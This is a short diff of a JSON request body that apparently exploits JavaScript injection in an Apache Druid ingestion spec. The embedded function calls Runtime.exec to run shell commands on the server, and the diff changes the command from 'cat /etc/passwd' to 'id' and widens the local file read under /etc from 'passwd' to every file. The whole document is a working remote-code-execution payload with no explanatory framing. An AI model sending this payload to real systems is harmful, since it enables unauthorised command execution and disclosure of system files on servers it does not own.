@@ -6,7 +6,7 @@
       "firehose": {
         "type": "local",
         "baseDir": "/etc",
-        "filter": "passwd"
+        "filter": "*"
       }
     },
     "dataSchema": {
@@ -16,7 +16,7 @@
           "format": "javascript",
           "timestampSpec": {},
           "dimensionsSpec": {},
-          "function": "function(){var fileContent = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"/bin/sh`@~-c`@~cat /etc/passwd\".split(\"`@~\")).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"1622212345709\",kadkand: fileContent}}",
+          "function": "function(){var fileContent = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"/bin/sh`@~-c`@~id\".split(\"`@~\")).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"1622212345709\",kadkand: fileContent}}",
           "": {
             "enabled": "true"
           }
